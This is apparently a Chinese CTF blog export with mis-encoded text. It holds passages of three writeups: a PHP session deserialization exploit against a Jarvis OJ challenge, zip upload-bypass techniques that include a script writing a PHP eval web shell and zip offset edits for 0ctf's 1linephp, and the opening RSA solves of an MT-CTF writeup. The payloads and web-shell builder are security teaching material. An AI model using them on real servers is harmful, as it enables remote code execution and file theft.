<span class="number">1234567899</span>,</span><br><span class="line">   <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">54554</span>,</span><br><span class="line">  ),</span><br><span class="line"> )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ï¼Œsessionä¸­çš„<code>field_name</code>å’Œ<code>name</code>éƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„è¾“å…¥ç‚¹ï¼</p>
<p>ä¸‹é¢æˆ‘ä»¬å°±å¼€å§‹è§£é¢˜æ‹¿åˆ°flag</p>
<p>é¦–å…ˆï¼Œ<code>http://web.jarvisoj.com:32784/index.php?phpinfo</code>æŸ¥è¯¢è®¾ç½®</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988673_622b0d81b3576c202ffb5-166727395787428.jpeg" alt="img"></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">On</span>   --è¡¨æ˜å…è®¸ä¸Šä¼ è¿›åº¦è·Ÿè¸ªï¼Œå¹¶å¡«å……$ _SESSIONå˜é‡</span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">Off</span>  --è¡¨æ˜æ‰€æœ‰POSTæ•°æ®ï¼ˆå³å®Œæˆä¸Šä¼ ï¼‰åï¼Œä¸æ¸…ç†è¿›åº¦ä¿¡æ¯($ _SESSIONå˜é‡)</span><br></pre></td></tr></table></figure>
<p>å³å…è®¸ä¸Šä¼ è¿›åº¦è·Ÿè¸ªä¸”ç»“æŸåä¸æ¸…é™¤æ•°æ®ï¼Œæ›´æœ‰åˆ©ä½¿ç”¨<code>session.upload_progress.name</code>æ¥å°†åˆ©ç”¨ä»£ç å†™å…¥<code>session</code>æ–‡ä»¶</p>
<p>æ„é€ <code>POST</code>è¡¨å•æäº¤ä¸Šä¼ æ–‡ä»¶</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;form action<span class="operator">=</span><span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method<span class="operator">=</span><span class="string">&quot;POST&quot;</span> enctype<span class="operator">=</span><span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line"> &lt;input type<span class="operator">=</span><span class="string">&quot;hidden&quot;</span> name<span class="operator">=</span><span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value<span class="operator">=</span><span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line"> &lt;input type<span class="operator">=</span><span class="string">&quot;file&quot;</span> name<span class="operator">=</span><span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line"> &lt;input type<span class="operator">=</span><span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ä½œä¸º<code>payload</code>ï¼ˆåˆ©ç”¨ä»£ç ï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>=<span class="string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>ä¸ºäº†é˜²æ­¢<code>&quot;</code>è¢«è½¬ä¹‰ï¼Œæˆ‘ä»¬åœ¨<code>payload</code>ä¸­åŠ å…¥<code>\</code></p>
<p>éšæ„é€‰æ‹©æ–‡ä»¶ï¼Œç‚¹å‡»è¡¨å•æäº¤ï¼Œä½¿ç”¨æŠ“åŒ…å·¥å…·<code>burpsuite</code>æŠ“å–è¯·æ±‚åŒ…</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988675_622b0d835c272ae8697f2-166727395787429.jpeg" alt="img"></p>
<p>å¹¶ä¿®æ”¹<code>filename</code>å€¼ä¸º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(<span class="built_in">dirname</span>(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>å‘é€è¯·æ±‚åŒ…ï¼Œä»£ç æ‰§è¡Œè¿‡ç¨‹åˆ†æï¼š</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988677_622b0d854159ffbe9883d-166727395787430.jpeg" alt="img"></p>
<p>å› æ­¤ç›´æ¥æ‰§è¡Œ<code>print_r(scandir(dirname(__FILE__)));</code>å¹¶è¿”å›</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988680_622b0d88d2b3473a44731-166727395787431.jpeg" alt="img"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">phpinfo`æŸ¥çœ‹å½“å‰ç›®å½•ï¼Œ`<span class="regexp">/opt/</span>lampp<span class="regexp">/htdocs/</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988683_622b0d8b6fba70304dd15-166727395787432.jpeg" alt="img"></p>
<p>æ„é€ æœ€ç»ˆ<code>payload</code>è¯»å–<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>æ–‡ä»¶å†…å®¹ï¼Œå³flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988684_622b0d8cd166d59b7b4d2-166727395787433.jpeg" alt="img"></p>
<h3 id="æ¡†æ¶é“¾å­"><a class="markdownIt-Anchor" href="#æ¡†æ¶é“¾å­"></a> æ¡†æ¶é“¾å­</h3>
<p>è¿˜æœ‰ä¸€äº›æ¡†æ¶è½¬æœ‰çš„é“¾å­ï¼Œè¯¦æƒ…é‡åˆ°å†è¯´å“¦ï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šé˜è¿°äº†QwQã€‚</p>
<p>ç¥å¸ˆå‚…ä»¬ï¼Œååºåˆ—åŒ–ç©çš„å¼€å¿ƒ~</p>
]]></content>
      <categories>
        <category>ååºåˆ—åŒ–</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFä¸­zipæ–‡ä»¶çš„ä½¿ç”¨</title>
    <url>/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>è¿™æ˜¯ä¸€åœºæ‹›æ–°èµ›ä¸­çš„ä¸€ä¸ªèµ›é¢˜åšçš„æ€»ç»“ï¼Œå¤§ä½¬ä»¬é”¤è½»ç‚¹QwQ</p>
<span id="more"></span>
<h1 id="ctfä¸­zipæ–‡ä»¶çš„ä½¿ç”¨"><a class="markdownIt-Anchor" href="#ctfä¸­zipæ–‡ä»¶çš„ä½¿ç”¨"></a> CTFä¸­zipæ–‡ä»¶çš„ä½¿ç”¨</h1>
<p>åœ¨CTFä¸­zipæ–‡ä»¶çš„å‡ºç°é¢‘ç‡å¾ˆé«˜ï¼Œå¤§å¤šå‡ºç°åœ¨Miscå’ŒCryptoèµ›é“ä»¥åŠ å¯†å’Œä¿®å¤çš„å§¿åŠ¿å‡ºç°ï¼Œä½†æœ¬æ–‡ä¸»è¦è®²è§£çš„æ˜¯åœ¨Webèµ›é“ä¸Šzipæ–‡ä»¶çš„ä¸€ä¸‹åˆ©ç”¨æ–¹å¼ã€‚</p>
<h2 id="åˆ©ç”¨å§¿åŠ¿onezipæŠ¥é”™è§£å‹"><a class="markdownIt-Anchor" href="#åˆ©ç”¨å§¿åŠ¿onezipæŠ¥é”™è§£å‹"></a> åˆ©ç”¨å§¿åŠ¿ONEâ€”zipæŠ¥é”™è§£å‹</h2>
<p>åˆ©ç”¨æ¡ä»¶ï¼šåªèƒ½ä¸Šä¼ å‹ç¼©åŒ…ï¼Œä¸”å‹ç¼©åŒ…å†…çš„å›¾ç‰‡ä¼šä¿ç•™ï¼Œå…¶ä»–éƒ½ä¼šåˆ é™¤ï¼Œå¯¹ç›®å½•ç©¿è¶Šåšäº†é™åˆ¶ï¼› åªèƒ½ä»è§£å‹æ–¹é¢å…¥æ‰‹ã€‚</p>
<h3 id="æ–‡ä»¶åæŠ¥é”™"><a class="markdownIt-Anchor" href="#æ–‡ä»¶åæŠ¥é”™"></a> æ–‡ä»¶å/æŠ¥é”™</h3>
<p>åœ¨PHPæ¶æ„ä¸­ï¼Œæœ‰ä¸€ä¸ªè‡ªå¸¦çš„è§£å‹å‡½æ•°ZipArchiveã€‚è¿™é‡Œçš„æŠ¥é”™è§£å‹å°±æ˜¯ä½¿ZipArchiveè¯†åˆ«æ–‡ä»¶å‡ºé”™ï¼Œä½†æ˜¯èƒ½å¤Ÿæ­£å¸¸ä¿ç•™å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ã€‚ä¾‹å¦‚åœ¨windowsä¸‹ä¸å…è®¸æ–‡ä»¶ä¸­åŒ…å«</p>
<p>å†’å·(ğŸ˜ƒï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨010editorä¸­ä¿®æ”¹å‹ç¼©æ–‡ä»¶çš„deFileNameå±æ€§çš„å€¼ï¼Œæ­¤æ—¶è§£å‹å°±ä¼šå‡ºé”™ï¼Œä½†æ˜¯ä¸€å¥è¯ä»£ç å°±ä¼šä¿ç•™ä¸‹æ¥ã€‚åœ¨Linuxä¸‹ä¹Ÿæœ‰ç±»ä¼¼çš„æ–¹æ³•ï¼Œå¯ä»¥å°†æ–‡ä»¶åæ”¹æˆ5ä¸ªæ–œæ (/////)ï¼Œæ­¤æ—¶Linuxå†™è§£å‹ä¹Ÿä¼šå‡ºé”™ï¼Œä½†æ˜¯ä¸€å¥è¯æœ¨é©¬è¢«ä¿ç•™ä¸‹æ¥äº†ã€‚</p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106143638292.png" alt="image-20221106143638292"></p>
<h3 id="è¶…é•¿æ–‡ä»¶åæŠ¥é”™ä¼´éšä¸€å¥è¯æœ¨é©¬"><a class="markdownIt-Anchor" href="#è¶…é•¿æ–‡ä»¶åæŠ¥é”™ä¼´éšä¸€å¥è¯æœ¨é©¬"></a> è¶…é•¿æ–‡ä»¶åæŠ¥é”™ä¼´éšä¸€å¥è¯æœ¨é©¬</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">mf = io.BytesIO()</span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(mf, mode=<span class="string">&quot;w&quot;</span>, compression=zipfile.ZIP_STORED) <span class="keyword">as</span> zf:</span><br><span class="line">    zf.writestr(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">b&#x27;@&lt;?php eval($_POST[TW])?&gt;&#x27;</span>)</span><br><span class="line">    zf.writestr(<span class="string">&#x27;A&#x27;</span> * <span class="number">5000</span>, <span class="string">b&#x27;AAAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shell.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(mf.getvalue())</span><br></pre></td></tr></table></figure>
<h2 id="åˆ©ç”¨å§¿åŠ¿twoåŒåè§£å‹"><a class="markdownIt-Anchor" href="#åˆ©ç”¨å§¿åŠ¿twoåŒåè§£å‹"></a> åˆ©ç”¨å§¿åŠ¿Twoâ€“åŒåè§£å‹</h2>
<h3 id="å‹ç¼©åŒ…ä¸­ç›®å½•åå’Œä¸€ä¸ªæ–‡ä»¶åç›¸åŒ"><a class="markdownIt-Anchor" href="#å‹ç¼©åŒ…ä¸­ç›®å½•åå’Œä¸€ä¸ªæ–‡ä»¶åç›¸åŒ"></a> å‹ç¼©åŒ…ä¸­ç›®å½•åå’Œä¸€ä¸ªæ–‡ä»¶åç›¸åŒ</h3>
<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªshell.phpï¼Œå†…åŒ…å«ä¸€å¥è¯æœ¨é©¬ï¼Œå…ˆæŠŠå‹ç¼©è¿›å‹ç¼©åŒ…</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">zip</span> -y test1.<span class="keyword">zip</span> <span class="keyword">shell</span>.php</span><br></pre></td></tr></table></figure>
<p>ç„¶ååˆ é™¤shell.phpåˆ›å»ºä¸€ä¸ªåŒåæ–‡ä»¶å¤¹ï¼Œé‡Œé¢éšä¾¿æ”¾ä¸€äº›ä¸œè¥¿ï¼Œå†å‹ç¼©è¿›åŒä¸€ä¸ªå‹ç¼©åŒ…</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mkdir</span> <span class="keyword">shell</span>.php</span><br><span class="line"><span class="keyword">zip</span> -y test1.<span class="keyword">zip</span> <span class="keyword">shell</span>.php/1.txt</span><br></pre></td></tr></table></figure>
<h3 id="åˆ›å»º0æ–‡ä»¶å¤¹ç»•è¿‡"><a class="markdownIt-Anchor" href="#åˆ›å»º0æ–‡ä»¶å¤¹ç»•è¿‡"></a> åˆ›å»ºâ€œ0â€æ–‡ä»¶å¤¹ç»•è¿‡</h3>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145439629.png" alt="image-20221106145439629"></p>
<p>è¿™é‡Œçš„read()å‡½æ•°ä¸ä¼šå¤„ç†0æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥è¿™é‡Œçš„arrayè¿”å›å€¼ä¸ºç©ºã€‚</p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145936187.png" alt="image-20221106145936187"></p>
<p>æ‰€ä»¥file_listå¾—åˆ°çš„ä¹Ÿæ˜¯ç©ºå€¼ï¼Œåœ¨æ‰§è¡Œåˆ é™¤ç›®å½•æˆ–è€…æ–‡ä»¶çš„æ—¶å€™ä¾¿ä¸ä¼šåˆ é™¤åˆ°0æ–‡ä»¶å¤¹ä¸‹çš„å†…å®¹ã€‚</p>
<h2 id="åˆ©ç”¨å§¿åŠ¿threeç›®å½•ç©¿è¶Š"><a class="markdownIt-Anchor" href="#åˆ©ç”¨å§¿åŠ¿threeç›®å½•ç©¿è¶Š"></a> åˆ©ç”¨å§¿åŠ¿Threeâ€“ç›®å½•ç©¿è¶Š</h2>
<h3 id="è½¯è¿æ¥"><a class="markdownIt-Anchor" href="#è½¯è¿æ¥"></a> è½¯è¿æ¥</h3>
<p>ç›®å‰é‡åˆ°çš„èµ›é¢˜MT-CTFåˆèµ›  ï¼Œç”±äºæ²¡æ‰¾åˆ°ç¯å¢ƒç°åœ¨æ‰“ä¸€ä¸‹ï¼Œå°±ç€æ¯”èµ›æ—¶å€™çš„writeupè¯´ä¸€ä¸‹</p>
<p>å…ˆè¯´ä¸€ä¸‹è½¯è¿æ¥</p>
<blockquote>
<p>è½¯è¿æ¥æ˜¯linuxä¸­ä¸€ä¸ªå¸¸ç”¨å‘½ä»¤ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯ä¸ºæŸä¸€ä¸ªæ–‡ä»¶åœ¨å¦å¤–ä¸€ä¸ªä½ç½®å»ºç«‹ä¸€ä¸ªåŒæ­¥çš„é“¾æ¥ã€‚</p>
<p>å…·ä½“ç”¨æ³•æ˜¯ï¼šln -s æºæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶ã€‚</p>
<p>å½“ æˆ‘ä»¬éœ€è¦åœ¨ä¸åŒçš„ç›®å½•ï¼Œç”¨åˆ°ç›¸åŒçš„æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬ä¸éœ€è¦åœ¨æ¯ä¸€ä¸ªéœ€è¦çš„ç›®å½•ä¸‹éƒ½æ”¾ä¸€ä¸ªå¿…é¡»ç›¸åŒçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åªè¦åœ¨å…¶å®ƒçš„ ç›®å½•ä¸‹ç”¨lnå‘½ä»¤é“¾æ¥ï¼ˆlinkï¼‰å°±å¯ä»¥ï¼Œä¸å¿…é‡å¤çš„å ç”¨ç£ç›˜ç©ºé—´</p>
</blockquote>
<p><a href="..........%5C%E6%A1%8C%E9%9D%A2%5CCTF%5CMT_CTF%5CMT-CTF%E5%86%B3%E8%B5%9B-Writeup.pdf">MT-CTFå†³èµ›-Writeup.pdf</a></p>
<h2 id="åˆ©ç”¨å§¿åŠ¿fouræ–‡ä»¶åŒ…å«"><a class="markdownIt-Anchor" href="#åˆ©ç”¨å§¿åŠ¿fouræ–‡ä»¶åŒ…å«"></a> åˆ©ç”¨å§¿åŠ¿Fourâ€“æ–‡ä»¶åŒ…å«</h2>
<h2 id="inephp-0ctf2021"><a class="markdownIt-Anchor" href="#inephp-0ctf2021"></a> inephp - 0ctf2021</h2>
<p><a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021/1linephp">è¿™ä¸ªé¢˜ç›®</a>å–è‡ªéå¸¸ç»å…¸çš„æ–‡ä»¶åŒ…å«é¢˜ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">(<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;yxxx&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>) &amp;&amp; @<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$_</span>)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>) === <span class="string">&#x27;@&lt;?php&#x27;</span> ? <span class="keyword">include</span>(<span class="variable">$_</span>) : <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) &amp;&amp; <span class="keyword">include</span>(<span class="string">&#x27;phpinfo.html&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œé™åˆ¶åç¼€å¿…é¡»æ˜¯<code>.php</code>çš„æ–‡ä»¶æ‰èƒ½å¤Ÿå®ç°åŒ…å«ã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨zipæ¥æ„æˆæ¡ä»¶ç«äº‰æ¥ä¸Šä¼ ã€‚</p>
<p>è¿™é‡Œéœ€è¦ä¼ ä¸€ä¸ªæ„é€ è¿‡çš„zipåŒ…ï¼Œç„¶åä»¤<code>yxxx=zip:///tmp/sess_evil#1</code>è¿™æ ·ï¼Œè®©åç»­çš„ä»£ç èƒ½å¤Ÿincludeå®ƒã€‚ä½†æ˜¾ç„¶é€šè¿‡<em>session.upload_progress</em>æä¸Šå»çš„æ–‡ä»¶æœ€å¼€å§‹çš„å­—ç¬¦ä¸²å†…å®¹æ˜¯<code>upload_progress_</code>ï¼Œæ‰€ä»¥å¿…é¡»æƒ³åŠæ³•ç»•è¿‡<code>@substr(file($_)[0],0,6) === '@&lt;?php'</code>çš„åˆ¤æ–­ã€‚</p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/1.png" alt="1.png"></p>
<p>æ ¹æ®<a href="https://github.com/corkami/collisions#zip">ä¸Šå›¾</a>ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°<code>End of Central Directory</code>(ä¸­å¤®ç›®å½•ç»“æŸ)é‡Œé¢æœ‰ä¸€ä¸ª<code>offset of start of central</code>(ä¸­å¿ƒèµ·ç‚¹çš„åç§»é‡)ï¼Œå·¦ä¸‹çš„ç¤ºæ„å›¾è¯´æ˜ç¨‹åºå¤„ç†zipæ–‡ä»¶çš„æ—¶å€™é¦–å…ˆä»è¿™ä¸ªæ–‡ä»¶æœ«å°¾å‡ºå‘ï¼Œæ ¹æ®åç§»æ‰¾åˆ°Central Directory<code>(ä¸­å¤®ç›®å½•)çš„å¤´ä½ç½®ï¼Œç„¶åå†æ ¹æ®</code>relative offset of local header<code>(æœ¬åœ°å¤´çš„ç›¸å¯¹åç§»é‡)æ‰¾åˆ°æ•´ä¸ªzipæ–‡ä»¶å¤´çš„ä½ç½®ï¼Œä¹Ÿå°±æŒ‡å‘</code>local file header signature`(æœ¬åœ°æ–‡ä»¶å¤´ç­¾å)</p>
<p><strong>zipæ„é€ </strong></p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">zip</span> <span class="keyword">shell</span>.<span class="keyword">zip</span> 1.php</span><br><span class="line">echo -<span class="keyword">n</span> <span class="string">&quot;upload_progress_&quot;</span> &gt; f</span><br><span class="line"><span class="keyword">cat</span> f <span class="keyword">shell</span>.<span class="keyword">zip</span> &gt; b.<span class="keyword">zip</span></span><br><span class="line"><span class="keyword">zip</span> -F b.<span class="keyword">zip</span> --<span class="keyword">out</span> c.<span class="keyword">zip</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„è§£å†³åŠæ³•å°±æ˜¯ä¿®æ”¹è¿™ä¸¤ä¸ªoffsetï¼Œè¿™æ ·zipåè®®èƒ½å¤Ÿè·³å¼€å‰é¢å‡ ä¸ªå­—ç¬¦æ‰¾åˆ°æ­£ç¡®çš„ä½ç½®ã€‚å¦å¤–ï¼ŒCRCçš„å€¼æˆ‘ä»¬ä¹Ÿä¸å¿…è¿›è¡Œä¿®æ”¹ï¼Œå› ä¸º<a href="https://stackoverflow.com/questions/63647618/how-to-validate-crc-32-calculation-of-zip-file">è¿™é‡Œçš„crc-32å…¶å®æ˜¯æ ¹æ®crcå‰é¢çš„ç›¸å…³ä¿¡æ¯è®¡ç®—å‡ºæ¥çš„ç»“æœ</a>ã€‚å› ä¸ºæœ€å¼€å§‹çš„å­—ç¬¦ä¸²å†…å®¹æ˜¯<code>upload_progress_</code>ï¼Œå…¶é•¿åº¦ä¸º16ï¼Œå› æ­¤è¿™ä¸¤ä¸ªoffsetï¼ˆä»010editoræ¥çœ‹å°±æ˜¯<code>elDirectoryOffset</code>(elç›®å½•åç§»é‡)å’Œ<code>deHeaderOffset</code>(deæ ‡å¤´åç§»é‡)ï¼‰éƒ½è¦åŠ ä¸Š16ã€‚</p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106185559363.png" alt="image-20221106185559363"></p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106184440246.png" alt="image-20221106184440246"></p>
]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«å¤ç°</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯æ€»ç»“</tag>
      </tags>
  </entry>
  <entry>
    <title>MT-CTF-Writeup</title>
    <url>/2022/09/MT-CTF-Writeup/</url>
    <content><![CDATA[<p>ç¾å›¢CTFï¼Œå¥½ç©çš„ï¼Œéš¾åº¦ä¹Ÿä¸é”™ï¼Œå¸ˆå‚…ä»¬å¤ªå¼ºå•¦ï¼</p>
<span id="more"></span>
<h1 id="mininep1æˆ˜é˜Ÿ-mt-ctf-writeup"><a class="markdownIt-Anchor" href="#mininep1æˆ˜é˜Ÿ-mt-ctf-writeup"></a> <strong>MiniNep1æˆ˜é˜Ÿ-MT-CTF-Writeup</strong></h1>
<h2 id="æˆ˜é˜Ÿä¿¡æ¯"><a class="markdownIt-Anchor" href="#æˆ˜é˜Ÿä¿¡æ¯"></a> <strong>æˆ˜é˜Ÿä¿¡æ¯ï¼š</strong></h2>
<h3 id="æˆ˜é˜Ÿæˆå‘˜twe1v3-zealot-1amfree-scr1pt_k1ddi3-zero"><a class="markdownIt-Anchor" href="#æˆ˜é˜Ÿæˆå‘˜twe1v3-zealot-1amfree-scr1pt_k1ddi3-zero"></a> æˆ˜é˜Ÿæˆå‘˜ï¼šTWe1v3ã€zealotã€1amfreeã€scr1pt_k1ddi3ã€ZERO</h3>
<h3 id="æˆ˜é˜Ÿåç§°mininep1"><a class="markdownIt-Anchor" href="#æˆ˜é˜Ÿåç§°mininep1"></a> <strong>æˆ˜é˜Ÿåç§°ï¼šMiniNep1</strong></h3>
<h3 id="æˆ˜é˜Ÿæ’å"><a class="markdownIt-Anchor" href="#æˆ˜é˜Ÿæ’å"></a> <strong>æˆ˜é˜Ÿæ’åï¼š</strong></h3>
<p><img src="/2022/09/MT-CTF-Writeup/xB5nlju1bu47FibXGyotBw.png" alt="x"></p>
<h2 id="è§£é¢˜æƒ…å†µ"><a class="markdownIt-Anchor" href="#è§£é¢˜æƒ…å†µ"></a> <strong>è§£é¢˜æƒ…å†µï¼š</strong></h2>
<p><img src="/2022/09/MT-CTF-Writeup/ezFtSI_DXc66SQ4rsGdDiw.png" alt="2"></p>
<h2 id="è§£é¢˜è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹"></a> è§£é¢˜è¿‡ç¨‹</h2>
<h3 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> <strong>Crypto</strong></h3>
<h4 id="strange_rsa1"><a class="markdownIt-Anchor" href="#strange_rsa1"></a> <strong>strange_rsa1</strong></h4>
<p>åœ¨ç»™å®šçš„å®æ•°åŸŸä¸Šæ±‚æ ¹ï¼Œç„¶åè½¬æ•´æ•°å¾—åˆ°qï¼Œè§£RSAå³å¯ã€‚</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">e = 0x10001</span><br><span class="line">n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413</span><br><span class="line">c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924</span><br><span class="line">gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938</span><br><span class="line"></span><br><span class="line"><span class="attribute">F</span>=RealField(prec=512*2)</span><br><span class="line">R.&lt;x&gt;=PolynomialRing(F)</span><br><span class="line"><span class="attribute">f</span>=x*x*gift-n</span><br><span class="line"><span class="attribute">r</span>=f.roots()[0][0]</span><br><span class="line"><span class="attribute">q</span>=int(abs(r))</span><br><span class="line"><span class="comment">#q=10481297369477678688647473426264404751672609241332968992310058598922120259940804922095197051670288498112926299671514217457279033970326518832408003060034369</span></span><br><span class="line"><span class="attribute">p</span>=n//q</span><br><span class="line"><span class="attribute">d</span>=inverse(e,(p-1)*(q-1))</span><br><span class="line"><span class="attribute">m</span>=pow(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;a5537b232c1ab750e0db61ec352504a301b7b212&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="strange_rsa2"><a class="markdownIt-Anchor" href="#strange_rsa2"></a> <strong>strange_rsa2</strong></h4>
<p>æ³¨æ„è¿™é¢˜ç”¨åˆ°äº†ä¸Šé¢˜çš„flagã€‚</p>
<p>ç»™å‡ºäº†ä¸¤ä¸ªéšæœºå¤šé¡¹å¼ï¼Œæˆ‘çš„æƒ³æ³•æ˜¯æ„é€ äºŒå…ƒå¤šé¡¹å¼ï¼Œç”¨grobneråŸºæ±‚å‡ºaã€‚ç”±äºæ¨¡æ•°pæœªçŸ¥ï¼Œå…ˆç”¨næ›¿ä»£ã€‚ç„¶è€Œè§£å®ŒæƒŠå¥‡åœ°å‘ç°é¡ºå¸¦æŠŠpç›´æ¥è§„çº¦å‡ºæ¥äº†ï¼Œå±äºæ˜¯æ„å¤–æ”¶è·äº†ã€‚åé¢è§£RSAå°±OKäº†ã€‚</p>
